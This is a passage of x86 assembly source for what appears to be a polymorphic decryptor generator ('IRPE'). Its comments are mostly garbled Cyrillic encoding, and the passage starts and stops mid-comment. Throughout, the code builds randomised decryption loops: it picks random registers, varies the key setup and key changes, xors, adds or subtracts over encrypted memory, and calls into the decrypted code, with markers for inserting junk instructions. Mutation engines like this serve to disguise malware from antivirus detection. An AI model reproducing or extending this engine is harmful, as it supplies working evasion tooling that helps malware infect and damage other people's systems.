																		;ॣ����1 = ࠧ���� ��஢������ ���� - �� ���祭�� � ���ਯ�� �㤥� 㬥������� �� 1 - � ���� �� �������� ����஢�� �ᥣ� ����; 
	cmp		irpe_gbd_dflag, 0
	je		_gb1_n_1_
	mov		eax, irpe_gbd_codesize										;eax = ࠧ��� ��� ��� ����஢��; 
	jmp		_gb1_n_2_

_gb1_n_1_:
	mov		eax, irpe_gbd_vca
	add		eax, irpe_gbd_codesize
	dec		eax															;eax = ���� ��᫥����� ���� ��஢������ ����; 

_gb1_n_2_:
	mov		irpe_gbd_imm32, eax

	call	gen_block_init												;���樠������ ॣ����1; (mov reg32, imm32; push imm8  pop reg32  add reg32, imm32; etc); 
	ret
;=======================[block_1 -> initialization of decryptor (address)]===============================



;=======================[block_2 -> initialization of decryptor (main_key)]==============================
gbd_block_2:															;ॣ����2 = �᭮����� (��������) ����� ��� ����஢��; 
	push	-1
	call	[ebx].rang_addr
	mov		irpe_gbd_imm32, eax
	mov		[esi].main_key, eax 										;������ �� �᭮��� ���箬; 
	
	call	gbd_xchg___reg1__reg2										;ॣ����2 � ��᪥ ᤥ���� ����, � ॣ����1 ᮮ�-�� ����; 

	call	gen_block_init												;���樠������ ॣ����2;

	call	gbd_xchg___reg1__reg2										;᭮�� �����塞 ॣ�����, �.�. ���⠢�� �� ���⭮ �� ᢮� ����; 
	ret
;=======================[block_2 -> initialization of decryptor (main_key)]==============================



;===============================[block_3 -> instr of crypt code]=========================================
gbd_block_3:															;decrypt [ॣ����1], ॣ����2 
	mov		eax, irpe_gbd_vca
	dec		eax
	mov		irpe_gbd_imm32, eax											;�᫨ ॣ1 = ࠧ���� ���� ��� ����஢��, ⮣�� ������� ����஢�� �㤥� ⠪�� xor/add/sub dword ptr [reg1 + <addr>], reg2; 

	call	gen_block_crypt												;����஢�� ��஢������ ���� =) 
	ret
;===============================[block_3 -> instr of crypt code]=========================================



;===============================[block_4 -> change of main_key]==========================================
gbd_block_4:															;��������� �᭮����� (��������) ���� (� ������ ���樨); 
	push	-1
	call	[ebx].rang_addr
	mov		irpe_gbd_imm32, eax

	call	gbd_xchg___reg1__reg2										;᭮�� ���塞 ॣ� 1 � 2 ���⠬�

	call	gen_block_chgkey											;chg ॣ����2

	call	gbd_xchg___reg1__reg2										;� ᭮�� �⠢�� ॣ� ���⭮ �� ᢮� ����; 
	ret
;===============================[block_4 -> change of main_key]==========================================



;=======================[block_5 -> change of address for decrypt of code]===============================
gbd_block_5:															;㬥��蠥� ���� ��� ����஢�� �� -1, ⠪�� ��ࠧ�� ���室�� � ����஢�� ��।���� ���� (� ���� � ��砫�); 
	push	-1
	call	[ebx].rang_addr
	mov		irpe_gbd_imm32, eax 
	
	call	gen_block_chgcnt
	ret
;=======================[block_5 -> change of address for decrypt of code]===============================



;===============================[block_6 -> cycle of decryptor]==========================================
gbd_block_6:															;�஢�ઠ, ����஢��� �� �� ���� ��� ��� ��� ���? �᫨ ���, ⮣�� ���室�� � ����஢�� ᫥���饣� ����; 
	push	irpe_gbd_vca
	pop		irpe_gbd_imm32

	call	gen_block_cycle
	ret
;===============================[block_6 -> cycle of decryptor]==========================================



;=============================[block_7 -> call of decrypted_code]========================================
gbd_block_7:															;������� ������� �맮�� (call -> 0xE8...) �� ����஢���� ���; 
	push	irpe_gbd_vca
	pop		irpe_gbd_imm32

	mov		edx, irpe_gbd_regs
	push	edx

	push	02															;��� ��砩�� ��ࠧ�� ��।��塞, ����� �� ॣ���஢ ���ਯ�� (���� �� 2-� ���������?) �㤥� �ᯮ�짮������ ��� �����樨 call reg32; 
	call	[ebx].rang_addr

	push	ecx
	imul	ecx, eax, 08
	shr		edx, cl
	pop		ecx

	mov		irpe_gbd_regs, edx

	call	gen_block_init												;init reg32;

	call	gen_block_call												;call reg32; 
	pop		irpe_gbd_regs
	ret
;=============================[block_7 -> call of decrypted_code]========================================



;===========================[����⠭���� ॣ����1 � ॣ����2 ���⠬�]=================================	
gbd_xchg___reg1__reg2:
	mov		eax, irpe_gbd_regs
	xchg	al, ah														;���塞 ���⠬� ॣ1 � ॣ2; 
	mov		irpe_gbd_regs, eax
	ret
;===========================[����⠭���� ॣ����1 � ॣ����2 ���⠬�]=================================



;=================================[���४�஢�� ࠧ����� ����稪��]====================================
gb_chg_param: 
	inc		[esi].tnob													;㢥��稢��� �� +1 �᫮ ������ ���ਯ��; 
	add		ecx, sizeof (IRPE_BLOCK_DATA_STRUCT)						;���室�� �� ���� ᫥���饣� ����� (��������); 
	ret
;=================================[���४�஢�� ࠧ����� ����稪��]====================================



;============[���������� ����� ��� ���饩 ������� ���樠����樨 ࠧ����� ��ࠬ��஢]===================
gen_block_init:															;
	cmp		irpe_gbd_imm32, 80h											;�஢�ਬ, ࠧ��� < 80h? 
	jae		_gbi_n1_													;�᫨ �����, ⮣�� ᣥ��ਬ ���� push/pop; 

	call	gen_push_pop___imm8___r32									;����ਬ; 
	ret

_gbi_n1_:
	push	03
	call	[ebx].rang_addr
	mov		irpe_gbd_tmp_var1, eax 
	
	push	03
	call	[ebx].rang_addr

	test	eax, eax
	je		_gbi_1_1_push_pop___imm8___r32_
	dec		eax
	je		_gbi_1_1_xor___r32__r32_

;--------------------------------------------------------------------------------------------------------

_gbi_1_mov___r32__imm32_:												;mov reg32, imm32
	call	gen_mov___r32__imm32
	ret

;--------------------------------------------------------------------------------------------------------

_gbi_1_1_push_pop___imm8___r32_:										;push imm8  pop reg32;
	push	7Eh
	call	[ebx].rang_addr

	inc		eax 
	inc		eax
	push	irpe_gbd_imm32												;save
	push	eax															;EAX = imm8 -> imm8 = [0x02..0x7F]; 
	mov		irpe_gbd_imm32, eax											;irpe_gbd_imm32 = imm8 in [0x02..0x7F]; 

	call	gen_push_pop___imm8___r32									;������㥬; 

	pop		eax
	pop		irpe_gbd_imm32												;restore

	cmp		irpe_gbd_tmp_var1, 0
	je		_gbi_1_2_sub___r32__imm32_
	dec		irpe_gbd_tmp_var1
	je		_gbi_1_2_xor___r32__imm32_

_gbi_1_2_add___r32__imm32_:												;add reg32, imm32;
	sub		irpe_gbd_imm32, eax
	call	gen_add___r32__imm32
	ret

_gbi_1_2_sub___r32__imm32_:												;sub reg32, imm32;
	sub		irpe_gbd_imm32, eax
	neg		irpe_gbd_imm32
	call	gen_sub___r32__imm32
	ret
	
_gbi_1_2_xor___r32__imm32_:												;xor reg32, imm32;
	xor		irpe_gbd_imm32, eax
	call	gen_xor___r32__imm32
	ret

;--------------------------------------------------------------------------------------------------------

_gbi_1_1_xor___r32__r32_:												;xor reg32, reg32 (reg32 == reg32); 
	mov		edx, irpe_gbd_regs
	push	edx
	mov		dh, dl
	mov		irpe_gbd_regs, edx
	call	gen_xor___r32__r32
	pop		irpe_gbd_regs

	cmp		irpe_gbd_tmp_var1, 0
	je		_gbi_1_2_sub___r32__imm32_2_
	dec		irpe_gbd_tmp_var1
	je		_gbi_1_2_xor___r32__imm32_2_

_gbi_1_2_add___r32__imm32_2_:											;add reg32, imm32
	call	gen_add___r32__imm32
	ret

_gbi_1_2_sub___r32__imm32_2_:											;sub reg32, imm32
	neg		irpe_gbd_imm32
	call	gen_sub___r32__imm32
	ret

_gbi_1_2_xor___r32__imm32_2_:											;xor reg32, imm32 
	call	gen_xor___r32__imm32
	ret

;--------------------------------------------------------------------------------------------------------

;============[���������� ����� ��� ���饩 ������� ���樠����樨 ࠧ����� ��ࠬ��஢]===================



;==============[���������� ����� ��� ���饩 ������� ���ਯ� ����: xchg/add/sub/etc]====================
gen_block_crypt:
	mov		[esi].crypt_alg, IRPE_XOR___M32__R32

	push	03
	call	[ebx].rang_addr

	test	eax, eax
	je		_gbc_sub___m32__r32_
	dec		eax
	je		_gbc_nxt_1_

_gbc_add___m32__r32_:
	mov		[esi].crypt_alg, IRPE_ADD___M32__R32
	call	gen_add___m32__r32
	ret

_gbc_sub___m32__r32_:
	mov		[esi].crypt_alg, IRPE_SUB___M32__R32
	call	gen_sub___m32__r32
	ret

_gbc_nxt_1_:															;add/sub/xor [reg1], reg2 
	call	gen_xor___m32__r32 
	ret

;==============[���������� ����� ��� ���饩 ������� ���ਯ� ����: xchg/add/sub/etc]====================



;===========[���������� ����� ��� ���饩 ������� ��������� �᭮����� ����: inc/dec]====================
gen_block_chgkey:
	push	irpe_gbd_imm32
	pop		[esi].slide_key												;������ ���祭�� � irpe_gbd_imm32 ������騬 ���箬 (�� ��� ���� �㤥� ������� ��ࠧ�� ���������� �᭮���� ����); 
	mov		[esi].chgkey_alg, IRPE_ADD___R32__IMM32
	
	push	06
	call	[ebx].rang_addr

	test	eax, eax
	je		_gbck_dec___r32_
	dec		eax
	je		_gbck_inc___r32_
	dec		eax
	je		_gbck_sub___r32__imm8_
	dec		eax
	je		_gbck_add___r32__imm8_
	dec		eax
	je		_gbck_nxt_1_

_gbck_sub___r32__imm32_:												;sub reg32, imm32
	mov		[esi].chgkey_alg, IRPE_SUB___R32__IMM32
	call	gen_sub___r32__imm32
	ret

_gbck_add___r32__imm8_:													;add reg32, imm8
	mov		[esi].chgkey_alg, IRPE_ADD___R32__IMM8
	shr		irpe_gbd_imm32, 24											;㡨ࠥ� 24 ������ ���, ������� 8 ����� (� ��� �⠭������ ����訬�); 
	btr		irpe_gbd_imm32, 07											;����塞 7-�� ���, ⠪�� ��ࠧ�� �� ��室� �㤥� �᫮ < 80h; 
	push	irpe_gbd_imm32
	pop		[esi].slide_key												;������ ���祭�� � irpe_gbd_imm32 ������騬 ���箬 (�� ��� ���� �㤥� ������� ��ࠧ�� ���������� �᭮���� ����); 
	call	gen_add___r32__imm8
	ret

_gbck_sub___r32__imm8_:													;sub reg32, imm8
	mov		[esi].chgkey_alg, IRPE_SUB___R32__IMM8
	shr		irpe_gbd_imm32, 24											;etc; 
	btr		irpe_gbd_imm32, 07
	push	irpe_gbd_imm32
	pop		[esi].slide_key												;������ ���祭�� � irpe_gbd_imm32 ������騬 ���箬 (�� ��� ���� �㤥� ������� ��ࠧ�� ���������� �᭮���� ����); 
	call	gen_sub___r32__imm8
	ret

_gbck_inc___r32_:														;inc reg32
	mov		[esi].chgkey_alg, IRPE_INC___R32
	mov		irpe_gbd_imm32, 01
	push	irpe_gbd_imm32
	pop		[esi].slide_key												;������ ���祭�� � irpe_gbd_imm32 ������騬 ���箬 (�� ��� ���� �㤥� ������� ��ࠧ�� ���������� �᭮���� ����); 
	call	gen_inc___r32
	ret

_gbck_dec___r32_:														;dec reg32
	mov		[esi].chgkey_alg, IRPE_DEC___R32
	mov		irpe_gbd_imm32, 01
	push	irpe_gbd_imm32
	pop		[esi].slide_key												;������ ���祭�� � irpe_gbd_imm32 ������騬 ���箬 (�� ��� ���� �㤥� ������� ��ࠧ�� ���������� �᭮���� ����); 
	call	gen_dec___r32
	ret

_gbck_nxt_1_:
	call	gen_add___r32__imm32 
	ret
;===========[���������� ����� ��� ���饩 ������� ��������� �᭮����� ����: inc/dec]==================== 

	

;==========[���������� ����� ��� ���饩 ������(�)(��) ��������� ���� ��� ���ਯ�]====================
gen_block_chgcnt:	
	push	02
	call	[ebx].rang_addr
	mov		irpe_gbd_tmp_var1, eax 

	push	03
	call	[ebx].rang_addr 

	test	eax, eax
	je		_gbcc_dec___r32_
	dec		eax
	je		_gbcc_as_sa___r32__imm32_

;--------------------------------------------------------------------------------------------------------

_gbcc_as_sa___r32__imm8_:												;add/sub reg32, imm8  sub/add reg32, imm8; (� �⮣� ࠧ��� �ᥣ�� �㤥� -1, �.�. �� 㬥��蠥� ॣ �ᥣ�� �� -1); 
	shr		irpe_gbd_imm32, 24
	btr		irpe_gbd_imm32, 07
	mov		edx, irpe_gbd_imm32
	shr		edx, 01
	cmp		irpe_gbd_tmp_var1, 0
	je		_gbcc_sa_r32_imm8_
_gbcc_as_r32_imm8_:														;add/sub reg32, imm8
	push	edx
	mov		irpe_gbd_imm32, edx
	call	gen_add___r32__imm8
	pop		edx
	inc		edx
	mov		irpe_gbd_imm32, edx
	call	gen_sub___r32__imm8
	ret

_gbcc_sa_r32_imm8_:														;sub/add reg32, imm8
	inc		edx
	push	edx
	mov		irpe_gbd_imm32, edx
	call	gen_sub___r32__imm8
	pop		edx
	dec		edx
	mov		irpe_gbd_imm32, edx
	call	gen_add___r32__imm8
	ret

;--------------------------------------------------------------------------------------------------------

_gbcc_as_sa___r32__imm32_:												;add/sub reg32, imm32  sub/add reg32, imm32
	mov		edx, irpe_gbd_imm32
	shr		edx, 01
	cmp		irpe_gbd_tmp_var1, 0
	je		_gbcc_sa_r32_imm32_
_gbcc_as_r32_imm32_:													;add/sub reg32, imm32
	push	edx
	mov		irpe_gbd_imm32, edx
	call	gen_add___r32__imm32
	pop		edx
	inc		edx
	mov		irpe_gbd_imm32, edx
	call	gen_sub___r32__imm32
	ret

_gbcc_sa_r32_imm32_:													;sub/add reg32, imm32
	inc		edx
	push	edx
	mov		irpe_gbd_imm32, edx
	call	gen_sub___r32__imm32
	pop		edx
	dec		edx
	mov		irpe_gbd_imm32, edx
	call	gen_add___r32__imm32
	ret

;--------------------------------------------------------------------------------------------------------

_gbcc_dec___r32_:														;dec reg32;
	call	gen_dec___r32
	ret

;--------------------------------------------------------------------------------------------------------
;==========[���������� ����� ��� ���饩 ������(�)(��) ��������� ���� ��� ���ਯ�]====================



;=======================[���������� ����� ��� ���饩 �������樨: cmp + jxx]============================
gen_block_cycle:	
	cmp		irpe_gbd_dflag, 0											;�᫨ ॣ1 = ����� ���� ��� ����஢��, ⮣�� ��룠�� �����; 
	je		_gbccl_n1_													;����, �᫨ ॣ1 = ࠧ���� ���� ��� ����஢��, ⮣�� 

	mov		eax, irpe_gbd_regs											;����ਬ ��㣮� �ࠢ����� � ���室; 
	push	eax
	mov		ah, al														;AND/OR/TEST REG1, REG2 -> REG1 == REG2; 
	mov		irpe_gbd_regs, eax

	push	03															;�����, �롨ࠥ�, ����� ������� �ࠢ����� �㤥� �������: 
	call	[ebx].rang_addr

	test	eax, eax
	je		_gbccl_test_r32r32_
	dec		eax
	je		_gbccl_or_r32r32_

_gbccl_and_r32r32_:														;AND REG32, REG32
	call	gen_and___r32__r32
	jmp		_gbccl_n2_

_gbccl_test_r32r32_:													;TEST REG32, REG32
	call	gen_test___r32__r32
	jmp		_gbccl_n2_

_gbccl_or_r32r32_:														;OR REG32, REG32
	call	gen_or___r32__r32

_gbccl_n2_:
	pop		irpe_gbd_regs
	call	gen_jne___imm32_imm8
	ret

_gbccl_n1_:

_gbccl_cmp_jxx___r32__imm32___imm32_imm8_:								;cmp reg32 imm32  jxx imm32/imm8; 
	call	gen_cmp___r32__imm32
	call	gen_jae___imm32_imm8
	ret

;=======================[���������� ����� ��� ���饩 �������樨: cmp + jxx]============================ 



;=========================[���������� ����� ��� ���饩 ������� call reg32]==============================
gen_block_call:															;call reg32; 
	call	gen_call___r32
	ret
;=========================[���������� ����� ��� ���饩 ������� call reg32]==============================



;=======================================[MOV REG32, IMM32]===============================================
gen_mov___r32__imm32:
	mov		[ecx].instr_addr, edi										;�����뢠�� ����, ��� �㤥� �ᯮ������ ������ �������
	mov		[ecx].instr_size, 05										;�� ࠧ���; 
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH)		;䫠��: ���筠� �������, � ⠪�� ��। ��� ����� ������� ���蠪; 
	mov		edx, irpe_gbd_regs											;edx - ⥯��� ᮤ�ন� ॣ�;
	mov		al, 0B8h
	add		al, dl
	stosb																;�����; 
	mov		eax, irpe_gbd_imm32
	stosd																;imm32;
	
	call	gb_chg_param												;���४��㥬 ����稪�;
	ret																	;��室��; 
;=======================================[MOV REG32, IMM32]===============================================



;=====================================[PUSH IMM8 + POP REG32]============================================
gen_push_pop___imm8___r32:
	mov		[ecx].instr_addr, edi										;���� �������
	mov		[ecx].instr_size, 02										;�� ࠧ���
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH + IRPE_BLOCK_BEGIN)
																		;䫠��: ���筠� ������� � ��। ��� ����� ������� ����; � ⠪��, �� ��� ���� ����� ������ ����讣� ����� (��砫� �⮣� �����); 
	mov		edx, irpe_gbd_regs											;edx = regs;
	mov		al, 6Ah
	stosb																;opcode;
	mov		eax, irpe_gbd_imm32											;eax = imm8; 
	stosb																;imm8; 
	add		ecx, sizeof (IRPE_BLOCK_DATA_STRUCT)						;���室�� �� ���� ᫥���饣� ���-����� (��������); 
	mov		[ecx].instr_addr, edi										;etc
	mov		[ecx].instr_size, 01
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH + IRPE_BLOCK_END)
																		;䫠��: ���筠� ������� + ����� ��। ��� ������� ��� + ����� �����;
																		;⠪�� ��ࠧ��, �� ��ନ஢��� ���� ����, ����騩 �� 2-� ������: push imm8 + pop reg32; 
	mov		al, 58h 
	add		al, dl 
	stosb																;pop reg32;

	call	gb_chg_param												;���४��㥬 ����稪�; 
	ret																	;�� ��室; 
;=====================================[PUSH IMM8 + POP REG32]============================================



;====================================[ADD/SUB/XOR REG32, IMM32]==========================================
;-------------------------------------------------------------------------------------------------------- 
gen_add___r32__imm32:													;ADD REG32, IMM32
	mov		eax, 0C005h

_gasxr32i32_b1_:
	mov		[ecx].instr_addr, edi										;addr
	mov		[ecx].instr_size, 05										;size
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH)		;���. ������� + ����� �㤥� �����஢��� ����� ������� ��। ������ ��������;
	mov		edx, irpe_gbd_regs											;edx = regs; 
	
	test	dl, dl														;REG == EAX?
	jne		_gasxr32i32_
	stosb																;�᫨ ��, ⮣�� �����뢠�� ��⨬���஢���� �����; 
	jmp		_gasxr32i_n_1_												;��룠�� �����;
_gasxr32i32_:
	inc		[ecx].instr_size											;����, 㢥��稢��� �� +1 ࠧ��� �������;
	mov		al, 81h														;opcode
	stosb
	mov		al, ah														;ah = modrm; 
	add		al, dl														;dl = reg;
	stosb																;write final modrm;
_gasxr32i_n_1_:
	mov		eax, irpe_gbd_imm32
	stosd																;imm32;

	call	gb_chg_param												;���४��㥬 ����稪�;
	ret																	;��室��; 

;--------------------------------------------------------------------------------------------------------

gen_sub___r32__imm32:													;SUB REG32, IMM32
	mov		eax, 0E82Dh
	jmp		_gasxr32i32_b1_

;--------------------------------------------------------------------------------------------------------

gen_xor___r32__imm32:													;XOR REG32, IMM32
	mov		eax, 0F035h 
	jmp		_gasxr32i32_b1_
;====================================[ADD/SUB/XOR REG32, IMM32]==========================================



;========================================[XOR REG32, REG32]==============================================
gen_xor___r32__r32:
	mov		[ecx].instr_addr, edi										;addr
	mov		[ecx].instr_size, 02										;size
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH)		;normal instr + can be generate trash-code before this instr; 
	mov		edx, irpe_gbd_regs											;edx = regs; 
	mov		al, 33h
	stosb																;opcode;
	mov		al, dl
	shl		al, 03
	add		al, dh
	add		al, 0C0h
	stosb																;modrm; 

	call	gb_chg_param												;���४��㥬 ����稪�
	ret																	;�� ��室; 
;========================================[XOR REG32, REG32]============================================== 



;=====================================[ADD/SUB/XOR MEM32, REG32]=========================================
gen_add___m32__r32:														;ADD MEM32, REG32 -> ADD dword ptr [REG1], REG2; etc; 
	mov		al, 01 

_gasx_m32r32_:
	mov		[ecx].instr_addr, edi										;addr
	mov		[ecx].instr_size, 02										;size
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH + IRPE_INSTR_LABEL)
																		;flags: ���筠� �������� + ��। �� �����樥� ����� �㤥� ������� ����-��� + �� �������-��⪠ - � ���� �� ��� �㤥� � ���쭥�襬 ��릮� (��� 横�); 
	mov		edx, irpe_gbd_regs											;edx = regs; 
	stosb																;opcode
	mov		al, dh														;dh = reg2; (reg2 - main key); 
	shl		al, 03														;
	add		al, dl														;dl = reg1; (reg1 - addr);

	cmp		irpe_gbd_dflag, 0											;�᫨ ॣ1 = ����� ���� ��� ��᫥���饩 ��� ����஢��, ⮣�� ��룠�� ����� (�㤥� ������� xor/add/sub dword ptr [reg1], reg2); 
	je		_gasx_m32r32_n1_
	add		[ecx].instr_size, 04										;�᫨ �� ॣ2 = ࠧ���� ���� ��� ����஢��, ⮣�� �㤥� ����ਬ ������� ����: add/sub/xor dword ptr [reg1 + <addr>], reg2; 
	add		al, 80h
	stosb
	mov		eax, irpe_gbd_imm32
	stosd
	jmp		_gasx_m32r32_n2_

_gasx_m32r32_n1_:
	stosb																;modrm; 

_gasx_m32r32_n2_:
	call	gb_chg_param												;���४��㥬 ����稪�;
	ret																	;��室��; 

;--------------------------------------------------------------------------------------------------------

gen_sub___m32__r32:
	mov		al, 29h														;SUB MEM32, REG32
	jmp		_gasx_m32r32_

;--------------------------------------------------------------------------------------------------------

gen_xor___m32__r32:
	mov		al, 31h														;XOR MEM32, REG32; 
	jmp		_gasx_m32r32_
;=====================================[ADD/SUB/XOR MEM32, REG32]=========================================



;==========================================[INC/DEC REG32]===============================================
gen_inc___r32:															;INC REG32;
	mov		al, 40h

_gid_r32_:
	mov		[ecx].instr_addr, edi										;addr
	mov		[ecx].instr_size, 01										;size
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH)		;normal + can be gen trash-code; 
	mov		edx, irpe_gbd_regs
	add		al, dl
	stosb																;+1; 

	call	gb_chg_param												;correct param's; 
	ret																	;exit;

;--------------------------------------------------------------------------------------------------------

gen_dec___r32:															;DEC REG32;
	mov		al, 48h
	jmp		_gid_r32_
;==========================================[INC/DEC REG32]===============================================



;======================================[ADD/SUB/XOR REG32, IMM8]=========================================
gen_add___r32__imm8:													;ADD REG32, IMM8
	mov		ah, 0C0h 

_gasx_r32i8_:
	mov		[ecx].instr_addr, edi										;addr
	mov		[ecx].instr_size, 03										;size
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH)		;flags: normal + gen_trash;
	mov		edx, irpe_gbd_regs											;edx = regs;
	mov		al, 83h														;opcode
	stosb
	mov		al, ah														;ah -> base modrm;
	add		al, dl														;dl -> reg32;
	stosb
	mov		eax, irpe_gbd_imm32											;eax -> imm8; 
	stosb

	call	gb_chg_param												;correct param's;
	ret																	;exit; 

;--------------------------------------------------------------------------------------------------------

gen_sub___r32__imm8:													;SUB REG32, IMM8
	mov		ah, 0E8h
	jmp		_gasx_r32i8_

;--------------------------------------------------------------------------------------------------------

gen_xor___r32__imm8:													;XOR REG32, IMM8; 
	mov		ah, 0F0h
	jmp		_gasx_r32i8_
;======================================[ADD/SUB/XOR REG32, IMM8]=========================================



;======================================[TEST/OR/AND REG32, REG32]========================================
gen_test___r32__r32:													;test reg32, reg32
	mov		al, 85h

_gtoa_r32r32_:
	mov		[ecx].instr_addr, edi										;addr
	mov		[ecx].instr_size, 02										;size
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH + IRPE_BLOCK_BEGIN)
																		;���筠� ������� + ����� ������� ���� ��। ��� + �� ������� ���� ����� ������ ����� ����� � ��㣨�� ��������� (jxx); 
	mov		edx, irpe_gbd_regs											;edx = regs;
	stosb																;opcode
	mov		al, dl														;reg
	shl		al, 03
	add		al, dh
	add		al, 0C0h
	stosb																;modrm
	add		ecx, sizeof (IRPE_BLOCK_DATA_STRUCT)						;���室�� �� ���� ᫥���饣� ���-����� (��������); 
	ret

;--------------------------------------------------------------------------------------------------------

gen_or___r32__r32:														;or reg32, reg32
	mov		al, 0Bh
	jmp		_gtoa_r32r32_

;--------------------------------------------------------------------------------------------------------

gen_and___r32__r32:														;and reg32, reg32; 
	mov		al, 23h
	jmp		_gtoa_r32r32_
;======================================[TEST/OR/AND REG32, REG32]========================================



;=====================================[CMP REG32, IMM32]=================================================
gen_cmp___r32__imm32:
	mov		[ecx].instr_addr, edi										;addr
	mov		[ecx].instr_size, 05										;size
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH + IRPE_BLOCK_BEGIN)	
																		;etc
	mov		edx, irpe_gbd_regs
	test	dl, dl														;REG == EAX?
	jne		_gcr32imm32_
	mov		al, 3Dh														;opcode
	stosb
	jmp		_gcr32i_n_1_
_gcr32imm32_:
	inc		[ecx].instr_size											;else inc instr_size
	mov		al, 81h
	stosb																;opcode
	mov		al, 0F8h 
	add		al, dl
	stosb																;modrm
_gcr32i_n_1_:
	mov		eax, irpe_gbd_imm32 
	stosd																;imm32; 
	add		ecx, sizeof (IRPE_BLOCK_DATA_STRUCT)						;���室�� �� ���� ᫥���饣� ���-����� (��������); 
	ret
;=====================================[CMP REG32, IMM32]=================================================



;====================================[JAE/JBE/JNE IMM32/IMM8]================================================
gen_jae___imm32_imm8:													;JAE
	mov		al, 73h

_gjabe_i_1_:
	mov		[ecx].instr_addr, edi										;addr
	mov		[ecx].instr_size, 01										;size: ��� ����� ������� ⮫쪮 �����, ⠪ ��� ⮫쪮 �� ��� � ���쭥�襩 ����������� ��� �ࠢ�����; ������� �㤥� ��ந�� ������, ⠪ ���� �������⥭ �筮 imm; 
	mov		[ecx].instr_flags, (IRPE_INSTR_JXX + IRPE_BLOCK_END)		;䫠��: �� ������㪨�� �᫮����� ���室� + �室�� � ���� ����让 ���� � ��㣨� (��㣮�) �������� (cmp); (� ��� ������� �����!); 
	stosb

	call	gb_chg_param												;���४��㥬 ����稪�
	ret																	;��室��; 

;--------------------------------------------------------------------------------------------------------

gen_jbe___imm32_imm8:													;JBE; 
	mov		al, 76h
	jmp		_gjabe_i_1_

;--------------------------------------------------------------------------------------------------------

gen_jne___imm32_imm8:													;JNE; 
	mov		al, 75h
	jmp		_gjabe_i_1_
;====================================[JAE/JBE/JNE IMM32/IMM8]================================================



;========================================[CALL REG32]====================================================
gen_call___r32:
	mov		[ecx].instr_addr, edi										;addr
	mov		[ecx].instr_size, 02										;size
	mov		[ecx].instr_flags, (IRPE_INSTR_NORMAL + IRPE_GEN_TRASH)		;etc; 
	mov		edx, irpe_gbd_regs											;
	mov		al, 0FFh
	stosb																;opcode
	mov		al, 0D0h
	add		al, dl
	stosb																;modrm

	call	gb_chg_param												;correct param's;
	ret																	;exit; 
;========================================[CALL REG32]====================================================





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�㭪� generate_regs
;������� 3-� ॣ���஢ ��� ���饣� ���ਯ��
;����:
;	(+)
;�����:
;	EAX		-	ॣ�; 
;	(+)		-	� ����������� ���� IRPE_CONTROL_BLOCK_STRUCT.used_regs; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
generate_regs:
	push	ecx
	xor		ecx, ecx													;ecx = 0; 

_reg1_:	
	call	gen_reg														;gen reg1; 

	bts		ecx, eax
	mov		ch, al														;ch = reg;

_reg2_:	
	call	gen_reg														;gen reg2;

	cmp		al, ch
	je		_reg2_
	bts		ecx, eax 
	mov		ah, ch														;eax: ah = reg1, al = reg2 (reg1 != reg); 
	mov		ch, 0
	mov		[esi].used_regs, ecx										;byte mask of regs; (1-� ����訩 ���� ������� ���� ᮤ�ন� 䫠�� ॣ��); 

	pop		ecx
	ret 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪� generate_regs 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�㭪� gen_reg
;����祭�� ��砩���� (�����) ॣ����
;����:
;	(+)
;�����:
;	EAX		-	����� ॣ�; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
gen_reg:
	push	08															;gen reg; reg != 4, reg != 5; 
	call	[ebx].rang_addr

	cmp		al, 04														;!= ESP
	je		gen_reg
	cmp		al, 05														;!= EBP 
	je		gen_reg
	
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪� gen_reg 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

	 



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�㭪� xmemset
;���㫥��� ��������� ���⪠ �����
;���� (stdcall: xmemset(xparam1, xparam2)):
;	xparam1		-	���� ���⪠ ����� ��� ���㫥���;
;	xparam2		-	ࠧ��� ���⪠ ����� ��� ���㫥���; 
;�����:
;	(+)			-	��� �⫨筮! 
